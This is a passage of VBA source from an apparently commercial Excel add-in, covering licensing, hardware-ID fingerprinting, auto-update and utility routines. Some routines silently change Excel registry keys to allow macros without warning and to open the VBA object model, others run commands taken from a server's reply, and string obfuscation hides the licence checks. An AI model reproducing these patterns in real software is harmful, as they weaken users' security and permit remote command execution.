    F_About.MultiPage1.Value = 0
End Sub

Sub ShowSettingsPage()
    On Error Resume Next: F_Settings.Show
End Sub
Sub ShowFirstRunForm()
    On Error Resume Next: F_FirstRun.Show
End Sub

Sub RunWithDelay(ByVal macroname$, Optional ByVal delay As Double = 0.5)
    On Error Resume Next: Dim delay_txt$
    delay_txt$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * delay, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & delay_txt$ & ", ""'" & ThisWorkbook.name & "'!" & macroname$ & """)"
End Sub

Function HWID(Optional ByVal Refresh As Boolean) As String
    On Error Resume Next: Dim v&, sv$, obj As Object, DriveID$, PartName$, DriveLetter$
    sv$ = GetSetting(PROJECT_NAME$, "Setup", "HWID")
    If sv$ <> "" Then If Not Refresh Then HWID = sv$: Exit Function

    DriveLetter$ = GetSetting(PROJECT_NAME$, "Setup", "DriveLetter")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = Environ("SystemDrive")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = "C:"
    With GetObject("winmgmts:")
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" & DriveLetter$ & "'} WHERE AssocClass = Win32_LogicalDiskToPartition"): PartName$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" & PartName$ & "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"): DriveID$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("SELECT * FROM Win32_DiskDrive WHERE DeviceID='" & Replace(DriveID$, "\", "\\") & "'"): v& = Val(obj.Signature): Next
    End With
    If v& = 0 Then HWID = "100000" & Mid(HID, 2) Else HWID = Right(Left(Replace(Abs((CSng(v) + 1.2345) / 0.00639), Mid(1 / 2, 2, 1), ""), 15) & Format(Abs(v Mod 1000), "000"), 16)
    SaveSetting PROJECT_NAME$, "Setup", "HWID", HWID
End Function

Function HID$()
    On Error Resume Next: Dim SN&: SN& = CreateObject("scripting.filesystemobject").GetDrive(ChrW(99) & ChrW(58)).SerialNumber
    HID$ = ChrW(115) & Format(Abs(934526875# - SN&), "0000000000")
End Function

Function GetVersion() As Long
    On Error Resume Next: GetVersion = Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number"))
    If GetVersion < 1000 Then GetVersion = 1000
End Function

Function GetVersionTXT(Optional ByVal ver& = 0)
    On Error Resume Next: If ver& = 0 Then ver& = GetVersion
    GetVersionTXT = Mid(ver&, 1, 1) & "." & Mid(ver&, 2, 1) & "." & Val(Mid(ver&, 3))
End Function

Sub SetVersion(ByVal n As Long)
    On Error Resume Next: If n < 1000 Then n = 1000
    ThisWorkbook.BuiltinDocumentProperties("Revision Number") = n
    ThisWorkbook.BuiltinDocumentProperties("Creation Date") = Now
End Sub
Function l0&(): On Error Resume Next: l0& = Val("&H" & Split(ThisWorkbook.Names(Chr(116) & Chr(100)).RefersTo, "%%")(1)): End Function
Function ll&(): On Error Resume Next: Dim d&, t&: d = Fix(l0 - (SETT.DTU - Val(SETT.RSP(1))) / 86400): t& = Val(SETT.RSP(3)): SETT.WSP 3, IIf(t > d, d + 1, t): ll& = 1: End Function
Private Sub PrintSettings_AsDefault()
    On Error Resume Next: Err.Clear: Dim arr, i&, txt
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr)
            txt = "SetDefaultSetting """ & arr(i, 0) & """, """ & arr(i, 1) & """"
            Debug.Print txt
        Next i
    End If
End Sub

Function ImportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    If xmlPath$ = "" Then
        xmlPath$ = FWF.GetFilePath(tt("ImportSettingsFileDialog", PROJECT_NAME$), ThisWorkbook.Path, tt("AddinSettings", PROJECT_NAME$), "*.xml")
    End If
    If xmlPath$ = "" Then Exit Function
    ImportSettings = SETT.ImportFromFile(xmlPath$, HideMessages)
End Function

Function ExportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim initial_filename$, dialog_title$, prevDir$, res As Variant
    If xmlPath$ = "" Then
        initial_filename$ = ThisWorkbook.Path & "\" & PROJECT_NAME$ & "_Settings_" & Format(Now, "DD.MM.YYYY_HH-NN-SS") & ".xml"
        dialog_title$ = tt("ExportSettingsFileDialog", PROJECT_NAME$)
        prevDir$ = CurDir$: ChDrive Left(initial_filename$, 1): ChDir ThisWorkbook.Path
        res = Application.GetSaveAsFilename(initial_filename$, tt("AddinSettings", PROJECT_NAME$) & " (*.xml),", , dialog_title$, tt("Save"))
        ChDrive Left(prevDir$, 1): ChDir prevDir$
        If VarType(res) = vbBoolean Then Exit Function
        xmlPath$ = CStr(res)
    End If
    ExportSettings = SETT.ExportToFile(xmlPath$, HideMessages)
End Function

Function PROGRAM_HYPERLINK$()
    PROGRAM_HYPERLINK$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "?ref=" & HWID
End Function

Sub Enable_AccessVBOM_Macro_DataConnections()
    On Error Resume Next: Dim sec_key$
    sec_key$ = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\"
    With CreateObject("WScript.Shell")
        .RegWrite sec_key$ & "AccessVBOM", 1, "REG_DWORD"
        .RegWrite sec_key$ & "VBAWarnings", 1, "REG_DWORD"
        .RegWrite sec_key$ & "DataConnectionWarnings", 0, "REG_DWORD"
    End With
End Sub

Function AddinAutoRun(Optional ByVal NewState As Variant) As Boolean
    On Error Resume Next
    Dim ShortcutFullName$, AI As AddIn
    ShortcutFullName$ = Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & ".lnk"
    If Not IsMissing(NewState) Then If Len(NewState) Then NewState = CBool(NewState)
    If Not VarType(NewState) = vbBoolean Then AddinAutoRun = FWF.FileExists(ShortcutFullName$): Exit Function

    If NewState = True Then
        With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
            .TargetPath = ThisWorkbook.FullName
            .Save
        End With
    ElseIf NewState = False Then
        Kill Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & "*.lnk"
    End If
    AddinAutoRun = CBool(NewState)

    For Each AI In Application.AddIns
        If AI.name = ThisWorkbook.name Then AI.Installed = False
    Next AI
End Function
Function DeleteOldCommandBar(): On Error Resume Next: Run TWN & "Request_": End Function
Function UninstallThisFile(Optional ByVal Mode& = 1)
    On Error Resume Next
    If Mode& = 1 Then
        If MsgBox(tt("MSG_UninstallConfirmation"), vbExclamation + vbOKCancel + vbDefaultButton2, _
                  tt("MSG_UninstallConfirmationTitle")) = vbCancel Then Exit Function
    End If
    If TrueDeveloper Then MsgBox "Uninstalling cancelled", vbInformation, "Mode=" & Mode&: Exit Function

    AddinAutoRun False
    Application.DisplayAlerts = False
    Dim FilePath$: FilePath$ = ThisWorkbook.FullName
    ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr FilePath$, vbNormal
    Kill FilePath$
    If Mode& = 1 Then If RUS Then FollowHyperlink UNINSTALL_HYPERLINK$
    'If Mode& >= 2 Then If RUS Then FollowHyperlink BREACH_EULA_HYPERLINK$
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Function

Function Developer() As Boolean: Developer = TrueDeveloper And (Dir("c:\testmode", vbNormal) = ""): End Function
Function TrueDeveloper() As Boolean
    Dim txt$: txt$ = Environ(Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(68) & Chr(79) & Chr(77) & Chr(65) & Chr(73) & Chr(78)): TrueDeveloper = (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(72) & ChrW(79) & ChrW(77) & ChrW(69) & ChrW(42)) Or (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(87) & ChrW(79) & ChrW(82) & ChrW(75) & ChrW(42))
End Function

Function MU_() As Boolean
    On Error Resume Next: Dim X: X = ll: Err.Clear: X = ThisWorkbook.VBProject.VBComponents.Count
    If TrueDeveloper Then Exit Function
    MU_ = Err = 0: If MU_ Then Exit Function
End Function

Function OfficeBits() As Long
    #If VBA7 And Win64 Then
        OfficeBits = 64
    #Else
        OfficeBits = 32
    #End If
End Function

Function TWN() As String: TWN = "'" & ThisWorkbook.name & "'!": End Function
Function O() As Long
    On Error Resume Next: Dim i&, t As Double: O = 2 ^ 30: If MU_ Then Exit Function
    If AS_ > 0 Then
        O = 0
    Else
        Application.EnableCancelKey = xlDisabled: ShowMainForm
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(73) & Chr(110) & Chr(102) & Chr(111))
            For i = 1 To 10
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(72) & Chr(76) & Chr(95) & Chr(66) & _
                              Chr(117) & Chr(121) & Chr(76) & Chr(105) & Chr(99) & Chr(101) & Chr(110) & Chr(115) & Chr(101))
            .ForeColor = RGB(255, 0, 0)
            For i = 1 To 4
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        Application.EnableCancelKey = xlInterrupt
    End If
End Function

Function cmdDisplay(txt) As String
    On Error Resume Next: Dim pass$, d&, i&, letter$
    If Left(txt, 1) = "P" Then txt = Mid(txt, 2): pass$ = "" Else pass$ = HID
    d = Val("&H" & Mid(txt, 1, 2))
    For i = 2 To Len(txt) / 2
        letter = Val("&H" & Mid(txt, 2 * i - 1, 2))
        cmdDisplay$ = cmdDisplay$ & Chr(letter Xor CInt(2 * d * Abs(Sin(3 * (i - 1)))) + Val(Mid(pass$, 2 + (i - 1) Mod 10, 1)))
    Next
End Function

Function CreateShortcutInStartMenu(Optional ByVal ShortcutName$ = PROJECT_NAME$, Optional ByVal ShortcutFolderName$)
    On Error Resume Next
    Dim ShortcutFullName$, folder$
    If ShortcutFolderName$ = "" Then ShortcutFolderName$ = tt("StartMenuFolderName")
    folder$ = CreateObject("WScript.Shell").SpecialFolders("StartMenu") & Application.PathSeparator
    If Len(Trim(ShortcutFolderName$)) Then
        folder$ = folder$ & FWF.Replace_symbols(ShortcutFolderName$) & Application.PathSeparator
        MkDir folder$
    End If

    ShortcutFullName$ = folder$ & FWF.Replace_symbols(ShortcutName$, " ") & ".lnk"
    Kill folder$ & "*" & PROJECT_NAME$ & "*.lnk"        ' deleting old shortcuts

    With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
        .TargetPath = ThisWorkbook.FullName
        .Description = tt("ProgramFullname") & vbNewLine & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        .Save
    End With
End Function

Sub UpdateStatus(Optional ByRef obj As MSForms.Label)
    On Error Resume Next: Dim txt$, ou$, col&, sh As Boolean
    With SETT
        Select Case Run(TWN & .U("41535F"))
            Case 4: ou$ = Trim(.GetRegValue(.U("757365726E616D65"))): If ou$ = "" Then ou$ = Trim(.GetRegValue(.U("656D61696C")))
                txt = tt("|4143545F4F4B") & vbNewLine & tt("|4143545F4F574E4552", ou$): col& = RGB(0, 150, 0): sh = True
            Case 1: txt = tt("|4143545F545249414C") & vbNewLine & tt("|4143545F444159534C454654", .RSP(3)): col& = RGB(200, 50, 0)
            Case 0: txt = tt("|4143545F45585049524544") & vbNewLine & tt("|4143545F4255594E4F57"): col& = RGB(255, 0, 0)
            Case Else: txt = .U("556E6B6E6F776E2061637469766174696F6E207374617475732E0D0A436F6E7461637420646576656C6F70657220746F206669782074686973206572726F722E"): col& = RGB(100, 0, 100)
        End Select
        obj.Caption = txt: obj.ForeColor = col
    End With
    With F_About
        .MultiPage1.Pages(SETT.U("506167655F526567496E666F")).Visible = Not sh: .Label_HL_Cabinet.Visible = sh
        .Label_HL_BuyLicense = tt("|465F41626F75745C4C6162656C5F484C5F4275794C6963656E7365" & IIf(sh, "32", ""))
        .Repaint
    End With
End Sub

Sub ApplyZoomTo(ByRef UF)
    On Error Resume Next: Dim zo&, dh&
    zo = SETT.GetNumber("ComboBox_Zoom", 100)
    If zo < 20 Then zo = 100
    dh& = UF.Height - UF.InsideHeight
    UF.Width = UF.Width * zo / 100: UF.Height = (UF.Height - dh&) * zo / 100 + dh&
    UF.zoom = zo
End Sub

Sub ExitProgram()
    On Error Resume Next
    If MsgBox(tt("MSG_ExitProgram"), vbQuestion + vbDefaultButton2 + vbOKCancel) = vbCancel Then Exit Sub
    DeleteProgramCommandBar
    ThisWorkbook.Close False
End Sub

' ---------------------------------------------------------------------------------------------------------------------
Function UpdateAvailable() As Boolean
    On Error Resume Next: UpdateAvailable = SETT.GetText("NewVersionURL", , "Updates") Like "http*://*.*/?*.xl*"
End Function

Sub ApplySettingSet(ByVal filename$)
    On Error Resume Next: Dim setting_set_name$, macroname$, ctrl As Object

    If filename$ Like "folder=?*" Then        ' dropdown changed
        setting_set_name$ = Application.CommandBars.ActionControl.text
        filename$ = Split(filename$, "folder=", 2)(1) & setting_set_name$ & ".xml"
    End If

    If filename$ Like "macro=?*&*" Then        ' button pressed
        macroname$ = Split(Split(filename$, "macro=", 2)(1), "&", 2)(0)
        filename$ = Split(filename$, "&", 2)(1)
        setting_set_name$ = Application.CommandBars.ActionControl.Caption
        setting_set_name$ = Mid(setting_set_name$, 2, Len(setting_set_name$) - 2)        ' TRIM
        If filename$ = "" Then setting_set_name$ = ""        ' for main button
    End If

    If SETT.ActivateSettingSet(setting_set_name$, filename$) Then
        If Len(macroname$) Then
            For Each ctrl In Application.CommandBars.ActionControl.Parent.Controls
                If ctrl.FaceId = Application.CommandBars.ActionControl.FaceId Then ctrl.State = msoButtonUp
            Next
            Application.CommandBars.ActionControl.State = msoButtonDown
            Run TWN & macroname$
        End If
        Run TWN & "SettingSetChanged"
    Else
        RunWithDelay "CreateProgramCommandBar", 0.5        ' incorrect setting set name
    End If
End Sub
Function AS_() As Long
    On Error Resume Next: Dim txt$
    With SETT
        txt$ = .GetRegValue(.U("636F6465")) & "@": txt = Split(txt, "@")(1)
        If Len(.k) * (txt = .k) Then AS_ = 4: Exit Function
        AS_ = -(.RSP(3) > 0)
    End With
End Function
Sub AddSettingsSwitcher(ByVal AddinMenu As Object, Optional ByVal SwitcherType As CONTROL_TYPES = ct_BUTTON, _
                        Optional ByVal SettingsFolderName$, Optional ByVal MainMacroName$, Optional ByRef MainMacroButton As Object)
    On Error Resume Next
    Dim coll As New Collection, SettingsFolder$, Item, filename$, MenuDropdown As Object, SettingSetName$, i&, UserSwitcherType&
    SettingsFolderName$ = Trim(Replace(SettingsFolderName$, "\", ""))
    If SettingsFolderName$ = "" Then SettingsFolderName$ = PROJECT_NAME$ & "Settings"
    SettingsFolder$ = ThisWorkbook.Path & "\" & SettingsFolderName$ & "\"

    If Not FWF.FolderExists(SettingsFolder$) Then Exit Sub
    Set coll = FWF.FilenamesCollection(SettingsFolder$, "*.xml", 1)
    If coll.Count = 0 Then Set coll = Nothing: Exit Sub

    If SwitcherType = ct_COMBOBOX Then SwitcherType = ct_DROPDOWN
    ' SwitcherType is one of ct_BUTTON or ct_COMBOBOX / ct_DROPDOWN

    UserSwitcherType& = SETT.GetNumber("SettingsSwitcher", 1, "Setup")
    ' user can disable switcher or change type of switcher by adding key "SettingsSwitcher" into Setup registry section
    ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
    Select Case UserSwitcherType&
        Case 0: Exit Sub
        Case 2: SwitcherType = ct_DROPDOWN
        Case 3: SwitcherType = ct_BUTTON
    End Select

    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    If SwitcherType = ct_DROPDOWN Then
        Set MenuDropdown = Add_Control(AddinMenu, ct_DROPDOWN, , "ApplySettingSet", tt("SettingSetDropdownCaption") & ":", _
                                       msoComboLabel, , "folder=" & SettingsFolder$)
        MenuDropdown.AddItem "<" & tt("DefaultSettingSetName") & ">"
    End If

    SettingSetName$ = SETT.GetCurrentSetName

    For Each Item In coll
        filename$ = Split(Dir(Item, vbNormal), ".xml")(0)

        Select Case SwitcherType
            Case ct_BUTTON
                With Add_Control(AddinMenu, ct_BUTTON, MainMacroButton.FaceId, "ApplySettingSet", " " & filename$ & " ", _
                                 msoButtonIconAndCaption, , "macro=" & MainMacroName$ & "&" & Item)
                    .State = IIf(SettingSetName$ = filename$, msoButtonDown, msoButtonUp)
                End With
            Case ct_DROPDOWN
                MenuDropdown.AddItem filename$
        End Select
    Next

    If SwitcherType = ct_DROPDOWN Then
        For i = 1 To MenuDropdown.ListCount
            If MenuDropdown.list(i) = SettingSetName$ Then MenuDropdown.ListIndex = i: Exit For
        Next i
        If MenuDropdown.ListIndex = 0 Then
            MenuDropdown.ListIndex = 1
            If SettingSetName$ <> "" Then SETT.ActivateSettingSet ""
        End If
    End If

    If SwitcherType = ct_BUTTON Then
        MainMacroButton.Tag = TWN & "ApplySettingSet" & "\\\" & "macro=" & MainMacroName$ & "&"
        MainMacroButton.State = IIf(SettingSetName$ = "", msoButtonDown, msoButtonUp)
    End If
    Set coll = Nothing
End Sub

Sub AddUpdateButton(ByRef AddinMenu As Object)
    On Error Resume Next
    If UpdateAvailable Then
        Dim UpdateButton As Object, UpdateButtonCaption$, UpdateType&, ShowUpdateButton As Boolean
        UpdateType& = SETT.GetNumber("NewVersionType", 0, "Updates")
        If UpdateType& > 0 Then
            ShowUpdateButton = UpdateType& > 1        '  ShowUpdateButton = InStr(1, "23", UpdateType&) > 0
            If ShowUpdateButton Then Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0

            If SETT.GetBoolean("AutoInstall", False, "Updates") Or (UpdateType& = 4) Then
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateInProgress")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Installing update in process |fffd|"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1977, "", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                UpdateButton.State = msoButtonDown
                InstallUpdate
            Else
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateReady")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Install update now"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1623, "InstallUpdate", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                RunWithDelay "DownloadUpdate", 2
            End If
        End If
    End If
End Sub
Sub DownloadUpdate()
    InstallUpdate True
End Sub

Sub InstallUpdate(Optional ByVal DownloadOnly As Boolean = False)
    On Error Resume Next
    Dim URL$, NewFilename$, FileSize&, OldFilename$, FilePath$

    If Not UpdateAvailable Then Exit Sub

    URL$ = SETT.GetText("NewVersionURL", , "Updates")
    SETT.SetText "InstallLastAttemptTime", Now, "Updates"
    NewFilename$ = FWF.temp_folder & FWF.Replace_symbols("Update_" & PROJECT_NAME$ & "_" & _
                                                         SETT.GetText("NewVersion", "X.X.X", "Updates") & "." & FWF.GetFileExtension(URL$))
    FileSize& = SETT.GetNumber("NewVersionSize", 0, "Updates")
    If FWF.FileExists(NewFilename$) And (FileSize& > 0) Then
        If FileLen(NewFilename$) <> FileSize& Then Kill NewFilename$
    End If
    Kill NewFilename$

    If Not FWF.FileExists(NewFilename$) Then
        SETT.SetText "InstallComment", "Start downloading file...  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.DownLoadFileFromURL(URL$, NewFilename$, True) Then
            SETT.SetText "InstallComment", "Can't download file", "Updates": Exit Sub
        End If
        SETT.SetText "InstallComment", "Download finished:  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.FileExists(NewFilename$) Then
            SETT.SetText "InstallComment", "Downloaded file not found", "Updates": Exit Sub
        End If
    End If

    If (FileSize& > 0) And (FileLen(NewFilename$) <> FileSize&) Then
        SETT.SetText "InstallComment", "Filesize does not match (original = " & FileSize& & ", downloaded = " & FileLen(NewFilename$) & ")", "Updates": Exit Sub
    End If
    If TrueDeveloper Then Application.StatusBar = Now & "  InstallUpdate started,  DownloadOnly = " & DownloadOnly: Exit Sub
    If DownloadOnly Then Exit Sub

    OldFilename$ = FWF.temp_folder & FWF.Replace_symbols("Backup_" & PROJECT_NAME$ & "_" & GetVersionTXT & _
                                                         "_" & Format(Now, "DD-MM-YYYY_HH-NN-SS") & "." & FWF.GetFileExtension(ThisWorkbook.FullName))
    SETT.SetText "LastBackup", OldFilename$, "Updates"

    Application.DisplayAlerts = False: If TrueDeveloper Then Exit Sub
    FilePath$ = ThisWorkbook.FullName: ThisWorkbook.ChangeFileAccess xlReadOnly
    SETT.SetText "InstallComment", "Deleting old version:  " & FilePath$, "Updates"
    SetAttr FilePath$, vbNormal
    FileCopy FilePath$, OldFilename$        ' old version backup
    Kill FilePath$: DoEvents
    If FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't delete old version", "Updates": Exit Sub
    End If
    SETT.SetText "InstallComment", "Old version was deleted successfully  " & FilePath$, "Updates"


    FileCopy NewFilename$, FilePath$: DoEvents
    If Not FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't copy new version", "Updates"
        Kill FilePath$: DoEvents
        FileCopy OldFilename$, FilePath$        ' old version restore
        Exit Sub
    End If

    SETT.SetText "InstallComment", "Update was successfully installed at " & Now, "Updates"
    Application.OnTime Now + TimeSerial(0, 0, 2), "'" & FilePath$ & "'" & "!ClearUpdatesInfo"
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Sub

Sub ClearUpdatesInfo()
    With SETT
        .Delete "NewVersionType", "Updates": .Delete "NewVersionNumber", "Updates": .Delete "NewVersionURL", "Updates"
        .Delete "NewVersionType", "Updates": .Delete "NewVersionSize", "Updates": .Delete "NewVersion", "Updates"
    End With
End Sub

Function Request_(ParamArray args()) As Boolean
    On Error Resume Next: Dim xmlhttp As Object, POST() As Byte, PostData$, i&, Response$
    Set xmlhttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    xmlhttp.Open "POST", UPDATES_HYPERLINK$, True
    xmlhttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    If Not IsMissing(args) Then
        For i = LBound(args) To UBound(args)
            If args(i) Like "?*=?*" Then PostData = PostData & "&" & Split(args(i), "=")(0) & "=" & Split(args(i), "=", 2)(1)
        Next i
    End If
    PostData = PostData & "&HWID=" & HWID(PostData Like "*action=activation*")
    POST = StrConv(URL_Encode(SETT.PostData & PostData), vbFromUnicode)
    xmlhttp.Send (POST): DoEvents

    If MU_ Or xmlhttp.WaitForResponse(3) Then
        If Val(xmlhttp.Status) <> 200 Then Debug.Print xmlhttp.Status, xmlhttp.StatusText
        Response$ = xmlhttp.ResponseText
    End If
    Set xmlhttp = Nothing
    If Response$ Like "%*%" Then Request_ = True: EXECUTE_COMMANDS Split(Response$, "%")(ll)
End Function

Function ProgramYears() As String
    On Error Resume Next: Dim BuiltDate As Date, PROJECT_LASTYEAR&
    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    PROJECT_LASTYEAR& = Year(BuiltDate): If PROJECT_LASTYEAR < 2015 Then PROJECT_LASTYEAR = Year(FileDateTime(ThisWorkbook.FullName))
    ProgramYears = IIf(Year(Now) > PROJECT_YEAR, PROJECT_YEAR & " - " & Year(Now), PROJECT_YEAR)
End Function

Function SwitchTab(TabName As String) As Boolean
    ' |fffd| Tony Jollans, August 2008.    http://www.wordarticles.com/Shorts/RibbonVBA/RibbonVBADemo.php
    On Error Resume Next: Dim RibbonTab As Object
    Set RibbonTab = GetAccessible(CommandBars("Ribbon"), &H25&, TabName)
    If RibbonTab Is Nothing Then Exit Function
    If (RibbonTab.accState(&H0&) And 32769) = 0 Then RibbonTab.accDoDefaultAction &H0&: SwitchTab = True
End Function
Public Function GetAccessible(Element As Object, RoleWanted&, NameWanted$, Optional GetClient As Boolean) As Object
    Dim ChildrenArray(), Child As Object, ndxChild&, ReturnElement As Object, NameComparand$, accName$, accValue$
    On Error Resume Next: accValue = Element.accValue(&H0&)
    accName = Element.accName(&H0&)
    Select Case accValue
        Case "Ribbon", "Quick Access Toolbar", "Ribbon Tabs List", "Lower Ribbon", "Status Bar": NameComparand = accValue
        Case "", "Ribbon Tab", "Group": NameComparand = accName
        Case Else: NameComparand = accName
    End Select
    If Element.accRole(&H0&) = RoleWanted And NameComparand = NameWanted Then
        Set ReturnElement = Element
    Else        ' not found yet
        ChildrenArray = GetChildren(Element)
        If (Not ChildrenArray) <> True Then
            For ndxChild = LBound(ChildrenArray) To UBound(ChildrenArray)
                If TypeOf ChildrenArray(ndxChild) Is Object  Then
                    Set Child = ChildrenArray(ndxChild)
                    Set ReturnElement = GetAccessible(Child, RoleWanted, NameWanted)
                    If Not ReturnElement Is Nothing Then Exit For
                End If        ' Child is Object
            Next ndxChild
        End If        ' there are children
    End If        ' still looking
    If GetClient Then Set ReturnElement = ReturnElement.accNavigate(&H7&, &H0&)
    Set GetAccessible = ReturnElement
End Function
Private Function GetChildren(Element As Object) As Variant()
    Const FirstChild As Long = 0&: Dim NumChildren&, ChildrenArray()
    #If Win64 Then
        Dim NumReturned As LongPtr
    #Else
        Dim NumReturned As Long
    #End If
    NumChildren = Element.accChildCount
    If NumChildren > 0 Then ReDim ChildrenArray(NumChildren - 1): AccessibleChildren Element, FirstChild, NumChildren, ChildrenArray(0), NumReturned
    GetChildren = ChildrenArray
End Function

Function UsageExampleExists(Optional ShowForm As Boolean = False) As Boolean
    On Error Resume Next: Dim UF As Object: Set UF = UserForms.Add("F_UsageExample")
    If Not UF Is Nothing Then
        UsageExampleExists = True
        If ShowForm Then UF.Show Else Unload UF
    End If
End Function

Sub FormSetError(ByRef UF As Object, Optional ByVal Control_Name$, Optional ByVal Labels_Name$)
    On Error Resume Next: Dim PrevColor&, i&, Label_Name, t As Double, objParent As Object
    UF.Show: DoEvents
    'Application.EnableCancelKey = xlDisabled
    If Len(Control_Name$) Then
        Set objParent = UF.Controls(Control_Name$).Parent
        Do While Not objParent Is Nothing
            If TypeName(objParent) = "Page" Then
                If TypeName(objParent.Parent) = "MultiPage" Then
                    objParent.Parent.Value = objParent.Parent.Pages(objParent.name).Index
                End If
            End If
            Err.Clear: i = i + 1: Set objParent = objParent.Parent
            If Err <> 0 Or i > 20 Then Exit Do
        Loop

        PrevColor& = UF.Controls(Control_Name$).BackColor
        UF.Controls(Control_Name$).BackColor = RGB(255, 0, 0)
    End If

    If Len(Labels_Name$) Then
        For Each Label_Name In Split(Labels_Name$, "|")
            With UF.Controls(Label_Name)
                .ForeColor = RGB(255, 0, 0)
                For i = 1 To IIf(UBound(Split(Labels_Name$, "|")) = 0, 6, 4)
                    .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
                Next
            End With
        Next
    End If

    If Len(Control_Name$) Then
        UF.Controls(Control_Name$).BackColor = PrevColor&
        UF.Controls(Control_Name$).SetFocus
    End If
    'Application.EnableCancelKey = xlInterrupt
    For i = 1 To 1000: DoEvents: Next
End Sub




Attribute VB_Name = "mod_AdditionalFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_AdditionalFunctions
' Author        : EducatedFool                     Date: 15.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module
Option Compare Text

Sub RenamePicturesInFolder()
    On Error Resume Next
    CreateObject("wscript.shell").Run "https://excelvba.ru/programmes/RenameFiles"
End Sub

Sub MergeEqualCells(ByRef all_filenames As Range, Optional ByRef pi As ProgressIndicator)
    On Error Resume Next: Err.Clear
    Dim ra As Range, cell1 As Range, cell2 As Range, currTXT$, prevTXT$, BlankCellsCount&, n&
    Application.DisplayAlerts = False
    pi.Line2 = tt("PI_MergeRowsInProgress") & "|fffd|": pi.Log tt("PI_MergeRowsInProgress") & "|fffd|"

    For Each ra In all_filenames.Areas
        currTXT$ = "::": prevTXT$ = ":::": arr = "": arr = ra.Value
        ra.VerticalAlignment = xlVAlignCenter
        If IsArray(arr) Then
            For i = LBound(arr) To UBound(arr)
                currTXT$ = arr(i, 1)
                If Trim(currTXT$) = "" Then
                    BlankCellsCount& = BlankCellsCount& + 1
                Else
                    If currTXT$ <> prevTXT$ Then
                        If cell1 Is Nothing Then
                            Set cell1 = ra.Cells(i, 1)
                            Set cell2 = Nothing
                        Else
                            Set cell2 = ra.Cells(i - 1 - BlankCellsCount&, 1)
                            If cell2.row > cell1.row Then
                                With all_filenames.Worksheet.Range(cell1, cell2)
                                    logtext$ = logtext$ & vbTab & tt("PI_MergeRowsInfo", cell1.row, cell2.row) & vbNewLine
                                    n = n + 1
                                    If n Mod 30 = 0 Then
                                        pi.Log logtext$: logtext$ = "": DoEvents
                                        pi.Line3 = tt("PI_DoneInPercent", Format(i / UBound(arr), "0%"))
                                    End If
                                    .Merge
                                    .VerticalAlignment = xlVAlignCenter
                                    With Intersect(.EntireRow, all_filenames.Worksheet.Columns(PICTURE_COLUMN(cell1)))
                                        .Merge
                                        .VerticalAlignment = xlVAlignCenter
                                    End With
                                End With
                            End If
                            Set cell1 = ra.Cells(i, 1): Set cell2 = Nothing
                        End If
                    End If
                    BlankCellsCount& = 0
                    prevTXT$ = currTXT$
                End If
            Next i

